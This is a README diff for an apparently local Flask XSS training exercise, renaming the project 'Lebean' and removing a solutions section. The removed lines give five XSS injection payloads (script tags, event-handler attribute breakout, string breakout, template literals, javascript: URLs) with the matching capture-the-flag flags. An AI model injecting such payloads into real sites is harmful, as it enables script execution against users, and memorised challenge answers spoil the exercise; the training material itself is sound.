@@ -1,4 +1,4 @@
-#Hello, Friend!
+# Lebean 
 
 Introducing...
 
@@ -19,38 +19,6 @@ flask run
 ```
 
 Open `http://localhost:5000` in browser, and have fun!
-
-## Solutions
-
-### Challenge 1
-
-Solution: `<script>alert(1)</script>`
-
-Flag: `flag{ezpz_xss_squeezy}`
-
-### Challenge 2
-
-Solution: `" onfocus="alert(1)` (or some other event)
-
-Flag: `flag{xss_on_event_fun_fun}`
-
-### Challenge 3
-
-Solution: `'); alert(1); //`
-
-Flag: `flag{xss_sneaky_clever_fren}`
-
-### Challenge 4
-
-Solution: `${alert(1)}`
-
-Flag: `flag{xss_templeet_string}`
-
-### Challenge 5
-
-Solution: `javascript:alert(1)`
-
-Flag: `flag{iframe_shenanigans_xss}`
 
 ## Docker
 
